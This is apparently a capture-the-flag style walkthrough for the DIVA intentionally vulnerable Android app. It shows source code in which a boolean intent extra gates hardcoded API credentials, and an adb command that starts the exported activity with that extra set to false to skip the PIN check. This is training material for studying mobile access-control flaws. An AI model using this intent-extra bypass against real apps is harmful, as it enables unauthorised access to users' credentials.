## Access Control Part 2

So this time, you will be greeted by a page thats asks you whether you have registered or not.

![greetings](https://github.com/Blahblahlolhahaha/Diva-walkthrough/blob/master/Access%20Control/Part%202/Screenshot%20from%202019-10-18%2009-18-14.png)

If you chose registered, the credentials will come out

![sweet data!](https://github.com/Blahblahlolhahaha/Diva-walkthrough/blob/master/Access%20Control/Part%202/Screenshot%20from%202019-10-18%2009-18-46.png)

If you chose register now, you will be prompted to enter the pin which you have gotten from payatu.com

![register](https://github.com/Blahblahlolhahaha/Diva-walkthrough/blob/master/Access%20Control/Part%202/Screenshot%20from%202019-10-18%2009-18-34.png)

So what if we try the method mentioned in part 1?

Lets see the source code:
    
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_access_control2);
    }

    public void viewAPICredentials(View view) {
        //RadioButton rbalreadyreg = (RadioButton) findViewById(R.id.aci2rbalreadyreg);
        RadioButton rbregnow = (RadioButton) findViewById(R.id.aci2rbregnow);
        Intent i = new Intent();
        boolean chk_pin = rbregnow.isChecked();

        // Calling implicit intent i.e. with app defined action instead of activity class
        i.setAction("jakhar.aseem.diva.action.VIEW_CREDS2");
        i.putExtra(getString(R.string.chk_pin), chk_pin);
        // Check whether the intent resolves to an activity or not
        if (i.resolveActivity(getPackageManager()) != null){
            startActivity(i);
        }
        else {
            Toast.makeText(this, "Error while getting Tveeter API details", Toast.LENGTH_SHORT).show();
            Log.e("Diva-aci1", "Couldn't resolve the Intent VIEW_CREDS2 to our activity");
        }
    }


so lets try this in the terminal:
   
   
    adm shell am start -a jakhar.aseem.diva.VIEW_CREDS2


![failed](https://github.com/Blahblahlolhahaha/Diva-walkthrough/blob/master/Access%20Control/Part%202/Screenshot%20from%202019-10-18%2009-24-13.png)

Apparently it doesnt work. Lets look at the source code for VIEW_CREDS2:

#### The vulnerability

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_apicreds2);
        TextView apicview = (TextView) findViewById(R.id.apic2TextView);
        EditText pintext  = (EditText) findViewById(R.id.aci2pinText);
        Button  vbutton   = (Button) findViewById(R.id.aci2button);
        Intent i = getIntent();
        boolean bcheck = i.getBooleanExtra(getString(R.string.chk_pin), true);

        if (bcheck == false) {
            // Connect to vendor cloud and send User PIN
            // Get API credentials and other confidential details of the user
            String apidetails = "TVEETER API Key: secrettveeterapikey\nAPI User name: diva2\nAPI Password: p@ssword2";
            // Display the details on the app
            apicview.setText(apidetails);
        }
        else {
            apicview.setText("Register yourself at http://payatu.com to get your PIN and then login with that PIN!");
            pintext.setVisibility(View.VISIBLE);
            vbutton.setVisibility(View.VISIBLE);
        }
    }
Apparently what you get is determined by a single boolean variable known as bcheck which is from chk_pin from the previous activity

If chk_pin is true, it gives you the page which prompts for the pin

Else, it shows you the credentials which is what we want!!!!

#### The exploit

So what we want is to start the activity with chk_pin being false!

so type this in the terminal:
        
     adb shell am start -a jakhar.aseem.diva.action.VIEW_CREDS2 -n jakhar.aseem.diva/.APICreds2Activity --ez check_pin false

--ez is used to pass a boolean value into the activity

![correct!](https://github.com/Blahblahlolhahaha/Diva-walkthrough/blob/master/Access%20Control/Part%202/Screenshot%20from%202019-10-18%2014-20-11.png)



#### Success!!!


